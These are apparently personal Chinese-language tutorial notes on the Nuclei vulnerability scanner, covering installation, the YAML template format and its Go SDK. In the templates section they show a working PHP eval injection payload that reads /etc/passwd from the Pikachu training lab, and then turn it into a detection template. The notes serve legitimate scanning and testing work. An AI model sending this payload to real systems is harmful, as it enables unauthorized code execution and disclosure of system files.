# nuclei

---

- [nuclei](#nuclei)
  - [安装](#安装)
  - [templates](#templates)
  - [Go SDK](#go-sdk)

---

> [projectdiscovery/nuclei：Nuclei 是一款快速、可定制的漏洞扫描器，由全球安全社区提供支持，并构建在简单的基于 YAML 的 DSL 上，支持协作解决互联网上的趋势漏洞。它可以帮助您查找应用程序、API、网络、DNS 和云配置中的漏洞。 --- projectdiscovery/nuclei: Nuclei is a fast, customizable vulnerability scanner powered by the global security community and built on a simple YAML-based DSL, enabling collaboration to tackle trending vulnerabilities on the internet. It helps you find vulnerabilities in your applications, APIs, networks, DNS, and cloud configurations.](https://github.com/projectdiscovery/nuclei)

Nuclei 是一款现代的高性能漏洞扫描器，它利用简单的基于 YAML 的模板。它使您能够设计模仿现实世界条件的自定义漏洞检测场景，从而实现零误报。

- 使用简单 YAML 格式用于创建和自定义漏洞模板
- 由数千名安全专业人员贡献，以解决热门漏洞
- 通过模拟真实世界的步骤来验证漏洞从而降低误报
- 超快并行扫描处理和请求聚类
- 集成到 CI/CD 管道中进行漏洞检测和回归测试
- 支持多种协议，如 TCP、DNS、HTTP、SSL、WHOIS JavaScript、代码等
- 集成 Jira、Splunk、GitHub、Elastic、GitLab。

---

官方推荐将 nuclei 作为独立命令行工具使用而非作为服务运行, 否则可能存在安全风险

---

## 安装

:::tabs

@tab:active Go

```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

> - 成功安装 Nuclei 需要最新的 GO 版本
> - 这条命令会触发拉取很多依赖库, 时间可能会比较长

---

@tab 二进制文件

直接在 `https://github.com/projectdiscovery/nuclei/releases` 下载对应的可执行程序

![image-20241119112516136](http://cdn.ayusummer233.top/DailyNotes/202411191125297.png)

![image-20241119142714714](http://cdn.ayusummer233.top/DailyNotes/202411191427019.png)

![image-20241119142743183](http://cdn.ayusummer233.top/DailyNotes/202411191427294.png)

![image-20241119142816477](http://cdn.ayusummer233.top/DailyNotes/202411191428521.png)

![image-20241119142847834](http://cdn.ayusummer233.top/DailyNotes/202411191428890.png)

可以给程序目录加个 PATH:

![image-20241119153635903](http://cdn.ayusummer233.top/DailyNotes/202411191536008.png)

:::

---

## templates

> [projectdiscovery/nuclei-templates: 社区维护的 nuclei 引擎模板列表，用于发现安全漏洞。 --- projectdiscovery/nuclei-templates: Community curated list of templates for the nuclei engine to find security vulnerabilities.](https://github.com/projectdiscovery/nuclei-templates)

 Template 是 nuclei 扫描器的核心, 它驱动着实际的扫描引擎。[projectdiscovery/nuclei-templates: Community curated list of templates for the nuclei engine to find security vulnerabilities.](https://github.com/projectdiscovery/nuclei-templates) 存储和托管官方团队提供的以及社区贡献的各种扫描器模板。

下面是一个简单的 HTTP 类型漏洞的 Nuclei  Template 示例:

```yaml
id: example-vulnerability # 模板的唯一标识符

info: # 模板的基本信息
  name: 示例漏洞检测 # 模板名称,简要描述模板的功能。
  author: 安全研究员 # 作者名称
  severity: medium # 漏洞严重程度,可选值为 info、low、medium、high、critical。
  description: 检测示例漏洞的模板 # 模板描述
  reference:
    - https://example.com/vulnerability # 参考链接
  tags: 示例,漏洞 # 模板标签，便于分类

http: # 定义 HTTP 请求的列表
  - method: GET # HTTP 请求方法
    path:
      - "{{BaseURL}}/vulnerable/path" # 请求路径，{{BaseURL}} 为目标基 URL
    headers: # 请求头（可选）
      User-Agent: Nuclei Scanner
    matchers-condition: and # 匹配条件（and/or）
    matchers:
      - type: word # 匹配器类型：关键字匹配;(可选值: word（关键字匹配）、regex（正则匹配）、status（状态码匹配）)
        part: body # 匹配响应的部分（此处为响应体）(可选body（响应体）、header（响应头）等)
        words:
          - "Vulnerable response" # 要匹配的关键字
      - type: status
        status:
          - 200 # 预期的 HTTP 状态码
```

在上述模板中，工具将向目标的 `/vulnerable/path` 发送一个 GET 请求。匹配器将检查响应状态码是否为 200（正常响应），并且响应体中是否包含关键字 `"Vulnerable response"`。只有在满足所有匹配条件的情况下，模板才认为目标存在该漏洞。

---

例如将如下 Pikachu RCE EXEC Eval 的 HTTP 请求改成 nuclei template

```http
POST /vul/rce/rce_eval.php HTTP/1.1
Host: 192.168.1.215:9221
Content-Length: 82
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.215:9221/vul/rce/rce_eval.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9tru1fbi3fto5uguhu9fd395ie
Connection: close

txt=echo+file_get_contents%28%27%2Fetc%2Fpasswd%27%29%3B&submit=%E6%8F%90%E4%BA%A4
```

---

```yaml
id: pikachu_rce_eval_cat_password # 模板的唯一标识符

info:
  name: PikachuRCEEval # 模板名称
  author: 233 # 作者名称
  severity: high # 漏洞严重程度
  description: |
    pikachu_rce_eval_cat_password 检测 /vul/rce/rce_eval.php 路径下是否存在远程命令执行漏洞，通过提交恶意命令并检查响应内容。
  reference:
    - "https://gitlab.hillstonenet.com/a-dlab/adlab-wiki/-/blob/main/漏洞信息库/命令执行类/命令执行_pikachu-rce-exec-eval/命令执行_pikachu-rce-exec-eval.md" # 参考链接
  tags: rce,PHP,pikachu

http:
  - method: POST # HTTP 请求方法
    path:
      - "{{BaseURL}}/vul/rce/rce_eval.php" # 请求路径，{{BaseURL}} 为目标基 URL
    headers:
      Content-Length: "82" # 内容长度
      Cache-Control: "max-age=0" # 缓存控制
      Upgrade-Insecure-Requests: "1" # 升级不安全请求
      Content-Type: "application/x-www-form-urlencoded" # 内容类型
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36" # 用户代理
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" # 接受的内容类型
      Referer: "{{BaseURL}}/vul/rce/rce_eval.php" # 引用页
      Accept-Encoding: "gzip, deflate" # 接受的编码
      Accept-Language: "zh-CN,zh;q=0.9" # 接受的语言
      Cookie: "PHPSESSID=9tru1fbi3fto5uguhu9fd395ie" # Cookie
      Connection: "close" # 连接方式
    body: "txt=echo+file_get_contents%28%27%2Fetc%2Fpasswd%27%29%3B&submit=%E6%8F%90%E4%BA%A4" # 请求体
    matchers-condition: and # 匹配条件
    matchers:
      - type: word # 匹配器类型：关键字匹配
        part: body # 匹配响应体
        words:
          - "root:x:0:0:" # 用于确认 /etc/passwd 内容的关键字
      - type: status # 匹配器类型：状态码匹配
        status:
          - 200 # 预期的 HTTP 状态码
```

然后可以用 nuclei 跑这个 template:

![image-20241122150629171](http://cdn.ayusummer233.top/DailyNotes/202411221506408.png)

---

## Go SDK

> [nuclei 包 - github.com/projectdiscovery/nuclei/v3/lib - Go 包 --- nuclei package - github.com/projectdiscovery/nuclei/v3/lib - Go Packages](https://pkg.go.dev/github.com/projectdiscovery/nuclei/v3@v3.1.10/lib#section-readme)

Nuclei 主要是一个 CLI 工具，但随着越来越多的用户希望将其作为库在自己的自动化中使用，其在 v3 中添加了一个简化的 nuclei 库/SDK

---

### 安装 Nuclei Go SDK

使用以下命令将 nuclei 作为库添加到 go 项目中:

```bash
go get -u github.com/projectdiscovery/nuclei/v3/lib
```



























